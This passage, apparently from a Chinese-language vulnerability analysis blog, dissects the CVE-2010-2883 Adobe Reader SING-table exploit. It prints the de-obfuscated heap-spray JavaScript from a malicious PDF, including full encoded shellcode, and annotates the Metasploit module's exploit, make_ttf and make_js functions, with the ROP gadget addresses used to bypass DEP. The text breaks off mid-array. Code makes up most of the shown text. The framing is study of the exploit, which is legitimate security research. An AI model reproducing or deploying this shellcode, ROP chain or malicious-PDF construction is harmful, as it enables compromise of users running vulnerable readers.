Spray</code>时，我们一般会将EIP控制到<code>0x0C0C0C0C</code>，利用<code>javascript</code>申请大量的<code>堆内存块</code>，并用包含着<code>0x90(nop)</code>和<code>shellcode</code>的内存片覆盖这些内存。通常javascript会<code>从内存低址向高址</code>分配内存，因此申请的内存<code>超过200MB</code>(200MB=200x1024x1024=0x0C800000&gt;0x0C0C0C0C)后，<code>0x0C0C0C0C</code>就会被含有<code>shellcode</code>的内存块覆盖。只要内存片中的<code>0x90</code>能够命中<code>0x0C0C0C0C</code>的位置，通过<code>滑行</code>，就可以执行到<code>shellcode</code>。</p><p>&emsp;&emsp;我们可以通过<code>PDFStreamDumper</code>看到内嵌的<code>javascript</code>代码。我们看到的代码是经过<code>混淆</code>的，所以将其复制出，将一些<code>变量名</code>和<code>对象名</code>进行重命名后，得到如下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>( <span class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u6dba%u42a5%udd5e%ud9c4%u2474%u5df4%uc931%u31b1%uc583%u3104%u0f55%u5503%u4762%ua2b7%u0594%u5b38%u6a64%ubeb0%uaa55%ucba6%u1ac5%u9eac%ud1e9%u0ae0%u977a%u3c2c%u12cb%u730b%u0fcc%u126f%u524e%uf4bc%u9d6f%uf5b1%uc0a8%ua738%u8e61%u58ef%uda06%ud233%uca54%u0733%ued2c%u9612%ub427%u18b4%ucce4%u02fc%ue9e9%ub9b7%u86d9%u6849%u6610%u55e5%u959d%u92f7%u4619%uea82%ufb5a%u2895%u2721%uab13%uac81%u1783%u6030%ud355%ucd3e%ubb11%ud022%ub7f6%u595e%u17f9%u19d7%ub3de%ufabc%ue57f%uac18%uf580%u11c3%u7d25%u46e9%udc54%u9867%u5aea%u9ac5%u64f4%uf379%uefc5%u8416%u25d9%u7a53%u6490%u13f5%ufd7d%u7e44%u2b7e%u878a%udefd%u7c72%uab1d%u3877%u4799%u5105%u684c%u52ba%u0b45%uc15d%ue205%u61f8%ufaaf'</span> );</span><br><span class="line"><span class="keyword">var</span> nop = <span class="built_in">unescape</span>( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> ); <span class="comment">//nop.length=2,unicode字符数</span></span><br><span class="line"><span class="keyword">while</span> (nop.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) <span class="comment">//2^16=65536,0x10000,nop长度最终为0x20000字节(128KB),这里的(+20+8)感觉没什么作用</span></span><br><span class="line">    nop+=nop;</span><br><span class="line">temp_chip = nop.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>); <span class="comment">//精准堆喷</span></span><br><span class="line">temp_chip += shellcode;</span><br><span class="line">temp_chip += nop;</span><br><span class="line">memory_chip = temp_chip.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);  <span class="comment">//memory_chip长度为0x10000字节(64KB)</span></span><br><span class="line"><span class="keyword">while</span>(memory_chip.length &lt; <span class="number">0x80000</span>)             <span class="comment">//memory_chip长度最终为0x80000*2=0x100000字节(1MB)</span></span><br><span class="line">    memory_chip += memory_chip;</span><br><span class="line">memory_chip_reduce = memory_chip.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>) / <span class="number">2</span>); <span class="comment">//加快堆喷速度(0x20+0x1000-0x8),对齐大小0x1000,x86使用的页面大小为4K</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> memory = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (count = <span class="number">0</span>; count &lt; <span class="number">0x1f0</span>; count++) <span class="comment">//0x1F0=496</span></span><br><span class="line">    memory[count] = memory_chip_reduce + <span class="string">"s"</span>;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;平常看到的<code>Heap Spray</code>代码都是使用<code>%u9090(NOP)</code>进行填充，看到这个漏洞的<code>Heap Spray</code>代码有点蒙逼，然后百度了一下，发现<code>%u0C0C</code>相当于<code>OR AL,0CH</code>，虽然说用到了AL，但是这肯定与后面的<code>shellcode</code>代码无关，所以也就相当于啥也没做。一般对<code>Heap Spray</code>的内存块填充以<code>NOP SLED + ShellCode</code>形式进行<code>填充</code>，NOP SLED在整个内存块中所占<code>比例较大</code>，所以当控制EIP转到<code>0x0C0C0C0C</code>执行时，命中<code>NOP SLED</code>的几率比较大。但是此漏洞使用的堆喷代码进行了<code>精准堆喷</code>,使地址<code>0x0C0C0C0C</code>处的代码就是用于<code>漏洞利用的有效代码</code>。由于<code>Windows</code>系统的<code>分配粒度</code>为<code>64KB</code>,所以分配到的<code>堆块首地址</code>的对齐大小为<code>0x10000</code>,堆块大小为<code>0x100000(1MB)</code>。我们只要让每个内存块中地址为<code>0x....0C0C</code>处的代码为<code>漏洞利用的有效代码</code>,就可以做到<code>精准堆喷</code>。为了<code>加快堆喷</code>的速度,我们可以将<code>1MB内存块</code>中,最后一个<code>0x10000</code>内存片中<code>shellcode后面</code>的数据剪掉,避免<code>无用数据</code>的赋值,就可以加快堆喷的速度。</p><p>&emsp;&emsp;从上面的代码可知，我们是用大小为<code>65536B</code>的数据填充<code>1MB</code>的内存块，每块数据的起始地址都是<code>0x....0000</code>,从<code>temp_chip = nop.substring(0, (0x0c0c-0x24)/2);</code>这句可以看出，是为了将<code>shellcode</code>放置在每个数据块(65536B)偏移为<code>0x0C0C-0x24</code>的位置。0x24(36 bytes=32+4)是因为申请到的内存块拥有一些<code>额外的信息</code>，为了精确的计算出偏移，所以要将这部分信息所占的内存减去。所以，当我们控制EIP跳转到<code>0x0C0C0C0C</code>时，可以直接执行<code>shellcode</code>。</p><table><thead><tr><th style="text-align:left"></th><th style="text-align:left">SIZE</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">header</td><td style="text-align:left">32 bytes</td><td style="text-align:left">堆块信息头</td></tr><tr><td style="text-align:left">string length</td><td style="text-align:left">4 bytes</td><td style="text-align:left">字符串长度</td></tr><tr><td style="text-align:left">terminator</td><td style="text-align:left">2 bytes</td><td style="text-align:left">字符串终止符，两个字节的NULL</td></tr></tbody></table><h3 id="0x43-Exploit脚本分析"><a href="#0x43-Exploit脚本分析" class="headerlink" title="0x43 Exploit脚本分析"></a>0x43 Exploit脚本分析</h3><h4 id="1、exploit"><a href="#1、exploit" class="headerlink" title="1、exploit()"></a>1、exploit()</h4><p>&emsp;&emsp;Exploit脚本位置在metasploit-framework/modules/exploits/windows/fileformat,其主函数为exploit,内容如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span></span></span><br><span class="line">    ttf_data = make_ttf() <span class="comment"># 构造ttf字体数据,SING表内容就在其中</span></span><br><span class="line"></span><br><span class="line">    js_data = make_js(payload.encoded) <span class="comment"># 构建Heap Spary js代码,ROP Chain及Payload就包含在里面</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Create the pdf</span></span><br><span class="line">    pdf = make_pdf(ttf_data, js_data) <span class="comment"># 构造pdf文件数据,将前面构造好的ttf字体数据和js代码放入其中</span></span><br><span class="line"></span><br><span class="line">    print_status(<span class="string">"Creating '<span class="subst">#&#123;datastore[<span class="string">'FILENAME'</span>]&#125;</span>' file..."</span>)</span><br><span class="line"></span><br><span class="line">    file_create(pdf) <span class="comment"># 创建pdf文件</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h4 id="2、make-ttf"><a href="#2、make-ttf" class="headerlink" title="2、make_ttf()"></a>2、make_ttf()</h4><p>&emsp;&emsp;此函数首先打开了一个<code>正常的ttf模板</code>文件,然后构造了<code>SING表</code>数据,将<code>ttf字体</code>文件中的<code>name表</code>数据替换为<code>构造的SING表</code>数据,<code>“name”</code>字符串替换为<code>“SING”</code>。<code>构造的SING表数据</code>包括用于将程序控制流劫持到<code>Heap Spary代码</code>处执行的<code>ROP Chain</code>,以及溢出后、获得程序控制流之前,用于绕过<code>造成程序执行出错</code>的数据。这部分在前面分析<code>此漏洞是怎样触发</code>的时候,介绍过。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_ttf</span></span></span><br><span class="line">    ttf_data = <span class="string">""</span></span><br><span class="line">    <span class="comment"># 加载正常的ttf字体文件</span></span><br><span class="line">    <span class="comment"># <span class="doctag">NOTE:</span> The 0day used Vera.ttf (785d2fd45984c6548763ae6702d83e20)</span></span><br><span class="line">    path = File.join( Msf::Config.data_directory, <span class="string">"exploits"</span>, <span class="string">"cve-2010-2883.ttf"</span> )</span><br><span class="line">    fd = File.open( path, <span class="string">"rb"</span> )</span><br><span class="line">    ttf_data = fd.read(fd.stat.size)</span><br><span class="line">    fd.close</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 构造SING表</span></span><br><span class="line">    sing = <span class="string">''</span></span><br><span class="line">    sing &lt;&lt; [</span><br><span class="line">        <span class="number">0</span>, <span class="number">1</span>,   <span class="comment"># tableVersionMajor, tableVersionMinor (0.1)</span></span><br><span class="line">        <span class="number">0xe01</span>,  <span class="comment"># glyphletVersion</span></span><br><span class="line">        <span class="number">0x100</span>,  <span class="comment"># embeddingInfo</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment"># mainGID</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment"># unitsPerEm</span></span><br><span class="line">        <span class="number">0</span>,      <span class="comment"># vertAdvance</span></span><br><span class="line">        <span class="number">0x3a00</span>  <span class="comment"># vertOrigin</span></span><br><span class="line">    ].pack(<span class="string">'vvvvvvvv'</span>) <span class="comment"># 把两个字符当作little-endian字节顺序的无符号的short。</span></span><br><span class="line">    <span class="comment"># uniqueName</span></span><br><span class="line">    <span class="comment"># "The uniqueName string must be a string of at most 27 7-bit ASCII characters"</span></span><br><span class="line">    <span class="comment">#sing &lt;&lt; "A" * (0x254 - sing.length)</span></span><br><span class="line">    sing &lt;&lt; rand_text(<span class="number">0x254</span> - sing.length) <span class="comment"># 生成随机文本字符,避免漏洞利用中的坏字符</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0xffffffff gets written here @ 0x7001400 (in BIB.dll)</span></span><br><span class="line">    <span class="comment"># 07001400  f0:ff08  lock dec dword ptr ds:[eax] ; eax=0x4a8a08e2,这句代码将[0x4a8a08e2]变为0xFFFFFFFF</span></span><br><span class="line">    <span class="comment"># 这段代码对eax指向的内存进行了读写,所以eax的值必须是一个可读可写的地址</span></span><br><span class="line">    <span class="comment"># 0x4a8a08e2位于icucnv36的.data段,0x4a8a08e2由this指针(对象(0x0012E608))的值得来(lea eax,dword ptr ds:[ecx+0x1C])</span></span><br><span class="line">    sing[<span class="number">0x140</span>, <span class="number">4</span>] = [<span class="number">0x4a8a08e2</span> - <span class="number">0x1c</span>].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This becomes our new EIP (puts esp to stack buffer),此ROPgadget使esp指向栈上uniqueName缓冲区内</span></span><br><span class="line">    <span class="comment"># ROP1</span></span><br><span class="line">    ret = <span class="number">0x4a80cb38</span> <span class="comment"># add ebp, 0x794 / leave / ret</span></span><br><span class="line">    sing[<span class="number">0x208</span>, <span class="number">4</span>] = [ret].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This becomes the new eip after the first return,此ROPgadget使esp变为Heap Spary中的Payload地址,并跳转到Payload执行</span></span><br><span class="line">    <span class="comment"># ROP2</span></span><br><span class="line">    ret = <span class="number">0x4a82a714</span> <span class="comment"># pop esp / ret</span></span><br><span class="line">    sing[<span class="number">0x18</span>, <span class="number">4</span>] = [ret].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># This becomes the new esp after the first return,Heap Spary中的Payload地址,新的esp</span></span><br><span class="line">    esp = <span class="number">0x0c0c0c0c</span></span><br><span class="line">    sing[<span class="number">0x1c</span>, <span class="number">4</span>] = [esp].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Without the following, sub_801ba57 returns 0.</span></span><br><span class="line">    sing[<span class="number">0x24c</span>, <span class="number">4</span>] = [<span class="number">0x6c</span>].pack(<span class="string">'V'</span>)</span><br><span class="line"></span><br><span class="line">    ttf_data[<span class="number">0xec</span>, <span class="number">4</span>] = <span class="string">"SING"</span></span><br><span class="line">    ttf_data[<span class="number">0x11c</span>, sing.length] = sing</span><br><span class="line"></span><br><span class="line">    ttf_data</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h4 id="3、make-js"><a href="#3、make-js" class="headerlink" title="3、make_js()"></a>3、make_js()</h4><p>&emsp;&emsp;此函数的功能将j<code>avascript的代码</code>转换为<code>字符串</code>,并将javascript的<code>变量名</code>进行<code>混淆</code>。javascript的代码用于<code>堆喷</code>,所以我们应将用于将<code>真正的shellcode</code>复制到<code>可读可写可执行</code>内存段的<code>ROP Chain</code>以及<code>经过编码的Payload</code>编入其中。将<code>真正的shellcode</code>复制到<code>可读可写可执行</code>内存段的<code>ROP Chain</code>的细节前面讲过了,就不说了。其他<code>关键部分</code>都做了注释,<code>函数功能</code>如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_js</span><span class="params">(encoded_payload)</span></span></span><br><span class="line">    <span class="comment"># 使用icucnv36.dll中的代码片段,构建ret2lib的ROP Chain.以此绕过DEP,执行shellcode.</span></span><br><span class="line">    stack_data = [</span><br><span class="line">        <span class="number">0x41414141</span>,   <span class="comment"># unused</span></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a8a0000</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret # save whatever eax starts as</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a84903c</span>,   <span class="comment"># becomes eax (import for CreateFileA)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- call CreateFileA</span></span><br><span class="line">        <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line">        <span class="number">0x4a8522c8</span>,   <span class="comment"># first arg to CreateFileA (lpFileName / pointer to "iso88591")</span></span><br><span class="line">        <span class="number">0x10000000</span>,   <span class="comment"># second arg  - dwDesiredAccess</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># third arg   - dwShareMode</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># fourth arg  - lpSecurityAttributes</span></span><br><span class="line">        <span class="number">0x00000002</span>,   <span class="comment"># fifth arg   - dwCreationDisposition</span></span><br><span class="line">        <span class="number">0x00000102</span>,   <span class="comment"># sixth arg   - dwFlagsAndAttributes</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># seventh arg - hTemplateFile</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># This points at a neat-o block of code that ... TBD</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#   and [esp+ebx*2],edi</span></span><br><span class="line">        <span class="comment">#   jne check_slash</span></span><br><span class="line">        <span class="comment"># ret_one:</span></span><br><span class="line">        <span class="comment">#   mov al,1</span></span><br><span class="line">        <span class="comment">#   ret</span></span><br><span class="line">        <span class="comment"># check_slash:</span></span><br><span class="line">        <span class="comment">#   cmp al,0x2f</span></span><br><span class="line">        <span class="comment">#   je ret_one</span></span><br><span class="line">        <span class="comment">#   cmp al,0x41</span></span><br><span class="line">        <span class="comment">#   jl check_lower</span></span><br><span class="line">        <span class="comment">#   cmp al,0x5a</span></span><br><span class="line">        <span class="comment">#   jle check_ptr</span></span><br><span class="line">        <span class="comment"># check_lower:</span></span><br><span class="line">        <span class="comment">#   cmp al,0x61</span></span><br><span class="line">        <span class="comment">#   jl ret_zero</span></span><br><span class="line">        <span class="comment">#   cmp al,0x7a</span></span><br><span class="line">        <span class="comment">#   jg ret_zero</span></span><br><span class="line">        <span class="comment">#   cmp [ecx+1],0x3a</span></span><br><span class="line">        <span class="comment">#   je ret_one</span></span><br><span class="line">        <span class="comment"># ret_zero:</span></span><br><span class="line">        <span class="comment">#   xor al,al</span></span><br><span class="line">        <span class="comment">#   ret</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a849038</span>,   <span class="comment"># becomes eax (import for CreateFileMappingA)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- call CreateFileMappingA</span></span><br><span class="line">        <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># arguments to CreateFileMappingA, hFile</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># lpAttributes</span></span><br><span class="line">        <span class="number">0x00000040</span>,   <span class="comment"># flProtect</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># dwMaximumSizeHigh</span></span><br><span class="line">        <span class="number">0x00010000</span>,   <span class="comment"># dwMaximumSizeLow</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># lpName</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x00000008</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a849030</span>,   <span class="comment"># becomes eax (import for MapViewOfFile</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># -- call MapViewOfFile</span></span><br><span class="line">        <span class="number">0x4a80b692</span>,   <span class="comment"># jmp [eax]</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># ret</span></span><br><span class="line">        <span class="number">0xffffffff</span>,   <span class="comment"># args to MapViewOfFile - hFileMappingObject</span></span><br><span class="line">        <span class="number">0x00000022</span>,   <span class="comment"># dwDesiredAccess</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># dwFileOffsetHigh</span></span><br><span class="line">        <span class="number">0x00000000</span>,   <span class="comment"># dwFileOffsetLow</span></span><br><span class="line">        <span class="number">0x00010000</span>,   <span class="comment"># dwNumberOfBytesToMap</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a8a0004</span>,   <span class="comment"># becomes ecx - writable pointer</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802196</span>,   <span class="comment"># mov [ecx],eax / ret - save map base addr</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x00000030</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a801f90</span>,   <span class="comment"># pop eax / ret</span></span><br><span class="line">        <span class="number">0x4a8a0004</span>,   <span class="comment"># becomes eax - saved file mapping ptr</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a7d8</span>,   <span class="comment"># mov eax,[eax] / ret - load saved mapping ptr</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a8063a5</span>,   <span class="comment"># pop ecx / ret</span></span><br><span class="line">        <span class="number">0x4a801064</span>,   <span class="comment"># becomes ecx - ptr to ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a842db2</span>,   <span class="comment"># xchg eax,edi / ret</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a802ab1</span>,   <span class="comment"># pop ebx / ret</span></span><br><span class="line">        <span class="number">0x00000020</span>,   <span class="comment"># becomes ebx - offset to modify</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x4a80a8a6</span>,   <span class="comment"># execute fun block</span></span><br><span class="line"></span><br><span class="line">        